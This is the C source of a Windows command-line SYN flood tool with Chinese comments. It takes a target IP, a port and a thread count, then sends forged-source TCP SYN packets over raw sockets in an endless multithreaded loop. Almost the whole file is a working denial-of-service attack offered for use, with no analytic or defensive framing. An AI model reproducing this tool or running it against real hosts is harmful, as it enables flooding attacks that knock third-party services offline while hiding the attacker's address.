#include <winsock2.h>
#include <Ws2tcpip.h> 
#include <stdio.h>
#pragma comment(lib,"ws2_32.lib")
#define SEQ 0x28376839
int threadnum,maxthread,port;
char *DestIP;//目标IP
void display(void)  // 定义状态提示函数 
{ 
	static int play=0;
	// 进度条 
	char *plays[12]= 
	{ 
		" | ", 
			" / ", 
			" - ", 
			" \\ ",
			" | ", 
			" / ", 
			" - ", 
			" \\ ", 
			" | ", 
			" / ", 
			" - ", 
			" \\ ", 
	}; 
	
	printf("=%s= %d threads \r", plays[play],threadnum);
	play=(play==11)?0:play+1;
} 
//定义一个tcphdr结构来存放TCP首部
typedef struct tcphdr
{
	USHORT th_sport;//16位源端口号
	USHORT th_dport;//16位目的端口号
	unsigned int th_seq;//32位序列号
	unsigned int th_ack;//32位确认号
	unsigned char th_lenres;//4位首部长度+6位保留字中的4位
	unsigned char th_flag;////6位标志位
	USHORT th_win;//16位窗口大小
	USHORT th_sum;//16位效验和
	USHORT th_urp;//16位紧急数据偏移量
}TCP_HEADER; 
//定义一个iphdr来存放IP首部
typedef struct iphdr//ip首部
{
	unsigned char h_verlen;//4位手部长度，和4位IP版本号
	unsigned char tos;//8位类型服务
	unsigned short total_len;//16位总长度
	unsigned short ident;//16位标志
	unsigned short frag_and_flags;//3位标志位（如SYN,ACK,等等)
	unsigned char ttl;//8位生存时间
	unsigned char proto;//8位协议
	unsigned short checksum;//ip手部效验和
	unsigned int sourceIP;//伪造IP地址
	unsigned int destIP;//攻击的ip地址
}IP_HEADER;

//TCP伪首部，用于进行TCP效验和的计算，保证TCP效验的有效性
struct
{
	unsigned long saddr;//源地址
	unsigned long daddr;//目的地址
	char mbz;//置空
	char ptcl;//协议类型
	unsigned short tcpl;//TCP长度
}PSD_HEADER; 
//计算效验和函数，先把IP首部的效验和字段设为0(IP_HEADER.checksum=0)
//然后计算整个IP首部的二进制反码的和。
USHORT checksum(USHORT *buffer, int size)
{
	unsigned long cksum=0;
	while(size >1) {
		cksum+=*buffer++;
		size-=sizeof(USHORT);
	}
	if(size) cksum+=*(UCHAR*)buffer;
	cksum=(cksum >> 16)+(cksum&0xffff);
	cksum+=(cksum >>16);
	return (USHORT)(~cksum); 
}
DWORD WINAPI SynfloodThread(LPVOID lp)//synflood线程函数
{
	SOCKET  sock =NULL;
	int ErrorCode=0,flag=true,TimeOut=2000,FakeIpNet,FakeIpHost,dataSize=0,SendSEQ=0;
	struct sockaddr_in sockAddr;
	TCP_HEADER  tcpheader;
	IP_HEADER   ipheader;
	char        sendBuf[128];
	sock=WSASocket(AF_INET,SOCK_RAW,IPPROTO_RAW,NULL,0,WSA_FLAG_OVERLAPPED);
	if(sock==INVALID_SOCKET)
	{
		printf("Socket failed: %d\n",WSAGetLastError());
		return 0;
	}
	//设置IP_HDRINCL以便自己填充IP首部
	ErrorCode=setsockopt(sock,IPPROTO_IP,IP_HDRINCL,(char *)&flag,sizeof(int));
	if(ErrorCode==SOCKET_ERROR)
	{
		printf("Set sockopt failed: %d\n",WSAGetLastError());
		return 0;
	}
	//设置发送超时
	ErrorCode=setsockopt(sock,SOL_SOCKET,SO_SNDTIMEO,(char*)&TimeOut,sizeof(TimeOut));
	if(ErrorCode==SOCKET_ERROR)
	{
		printf("Set sockopt time out failed: %d\n",WSAGetLastError());
		return 0;
	}
    //设置目标地址
	memset(&sockAddr,0,sizeof(sockAddr));
	sockAddr.sin_family=AF_INET;
	sockAddr.sin_addr.s_addr =inet_addr(DestIP);
	FakeIpNet=inet_addr(DestIP);
	FakeIpHost=ntohl(FakeIpNet);
    //填充IP首部
	ipheader.h_verlen=(4<<4 | sizeof(IP_HEADER)/sizeof(unsigned long));
	ipheader.total_len = htons(sizeof(IP_HEADER)+sizeof(TCP_HEADER));
	ipheader.ident = 1;
	ipheader.frag_and_flags = 0;
	ipheader.ttl = 128;
	ipheader.proto = IPPROTO_TCP;
	ipheader.checksum =0;
	ipheader.sourceIP = htonl(FakeIpHost+SendSEQ);
	ipheader.destIP = inet_addr(DestIP);
    //填充TCP首部
	tcpheader.th_dport=htons(port);
	tcpheader.th_sport = htons(8080);
	tcpheader.th_seq = htonl(SEQ+SendSEQ);
	tcpheader.th_ack = 0;
	tcpheader.th_lenres =(sizeof(TCP_HEADER)/4<<4|0);
	tcpheader.th_flag = 2;
	tcpheader.th_win = htons(16384);
	tcpheader.th_urp = 0;
	tcpheader.th_sum = 0;
	
	PSD_HEADER.saddr=ipheader.sourceIP;
	PSD_HEADER.daddr=ipheader.destIP;
	PSD_HEADER.mbz=0; 
	PSD_HEADER.ptcl=IPPROTO_TCP;
	PSD_HEADER.tcpl=htons(sizeof(tcpheader));
	for(;;)
	{
		SendSEQ=(SendSEQ==65536)?1:SendSEQ+1;
		ipheader.checksum =0;
		ipheader.sourceIP = htonl(FakeIpHost+SendSEQ);
		tcpheader.th_seq = htonl(SEQ+SendSEQ);
		tcpheader.th_sport = htons(SendSEQ);
		tcpheader.th_sum = 0;
		PSD_HEADER.saddr=ipheader.sourceIP;
		
		//把TCP伪首部和TCP首部复制到同一缓冲区并计算TCP效验和
		memcpy(sendBuf,&PSD_HEADER,sizeof(PSD_HEADER));
		memcpy(sendBuf+sizeof(PSD_HEADER),&tcpheader,sizeof(tcpheader));
		tcpheader.th_sum=checksum((USHORT *)sendBuf,sizeof(PSD_HEADER)+sizeof(tcpheader));
		memcpy(sendBuf,&ipheader,sizeof(ipheader));
		memcpy(sendBuf+sizeof(ipheader),&tcpheader,sizeof(tcpheader));
		memset(sendBuf+sizeof(ipheader)+sizeof(tcpheader),0,4);
		dataSize=sizeof(ipheader)+sizeof(tcpheader);
		ipheader.checksum=checksum((USHORT *)sendBuf,dataSize);
		memcpy(sendBuf,&ipheader,sizeof(ipheader));
		sendto(sock,sendBuf,dataSize,0,(struct sockaddr*) &sockAddr,sizeof(sockAddr));
		display();
   	}//end for
    Sleep(20);
    InterlockedExchangeAdd((long *)&threadnum,-1);
	return 0;
}
void usage(char *name)
{
	printf("\t===================SYN Flood======================\n");
	printf("\t==========gxisone@hotmail.com     2004/7/6========\n");
	printf("\tusage: %s [dest_IP] [port] [thread]\n",name);
	printf("\tExample: %s 192.168.1.1 80 100\n",name);
}
int main(int argc,char* argv[])
{
    if(argc!=4)
	{
		usage(argv[0]);
		return 0;
	}
	usage(argv[1]);
	int ErrorCode=0;
	DestIP=argv[1];//取得目标主机IP
	port=atoi(argv[2]);//取得目标端口号
	
	maxthread = atoi(argv[3]);
	maxthread=(maxthread>100)?100:atoi(argv[3]);
	//如果线程数大于100则把线程数设置为100

	WSADATA wsaData;
	if((ErrorCode=WSAStartup(MAKEWORD(2,2),&wsaData))!=0){
		printf("WSAStartup failed: %d\n",ErrorCode); 
		return 0;
	}
	printf("[start]...........\nPress any key to stop!\n");
	while(threadnum<maxthread)//循环创建线程
	{
		if(CreateThread(NULL,0,SynfloodThread,0,0,0))
		{
			Sleep(10);
			threadnum++;
		}
	}
	WSACleanup();
	printf("\n[Stopd]...........\n");
	return 0;
}
